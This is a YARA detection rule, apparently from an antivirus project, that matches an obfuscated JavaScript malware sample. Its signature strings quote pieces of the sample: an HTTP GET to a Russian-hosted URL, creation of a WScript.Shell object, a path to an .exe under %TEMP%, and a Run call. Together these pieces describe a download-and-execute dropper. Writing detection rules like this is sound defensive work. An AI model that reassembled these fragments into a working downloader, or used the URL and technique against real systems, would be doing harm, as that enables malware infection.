rule sig_20160330_92f4fba98eeb2d489af820c0aabfa9f8 {
  meta:
    description = "datamaliciousorder - file 20160330_92f4fba98eeb2d489af820c0aabfa9f8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "137da1ade13bdb52df410201032190564494a9cc7b166e211a000114d58ae963"

  strings:
    $s1  = "S1[WZ](\"GET\", \"http://zakaz-sharikov.ru/x9dslp\", false);" fullword ascii
    $s2  = "function NQ(XH, D){OC = OC * 1; return XH - D;};" fullword ascii
    $s3  = "var W = function LQ() {return WScript[VT](\"WScript\"+\".Shell\");}(), Z0 = 11;" fullword ascii
    $s4  = "if (S1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function RY(){return EZ + \"\";};" fullword ascii
    $s6  = "function NE() {return W[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"OefP3dYvPJDeM.ex\" + \"e\";};" fullword ascii
    $s7  = "function FD(Y){W[\"Run\"](Y, OC, OC);};" fullword ascii
    $s8  = "function KR() {return ((KB == true) && (KB == GU)) ? 1 : OC;};" fullword ascii
    $s9  = "function Z()" fullword ascii
    $s10 = "function P(){return VT;};" fullword ascii
    $s11 = "function XR(){return 22;};" fullword ascii
    $s12 = "var RV = new this[\"Date\"]();" fullword ascii
    $s13 = "function QB(CR) {var B = (1, 2, 3, 4, 5, CR); return B;};" fullword ascii
    $s14 = "return NQ(T0, XL);" fullword ascii
    $s15 = "}while (SR);" fullword ascii
    $s16 = "GU = true; " fullword ascii
    $s17 = "var KB = false;" fullword ascii
    $s18 = "KB = true; " fullword ascii
    $s19 = "var GU = false;" fullword ascii
    $s20 = "var BA = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}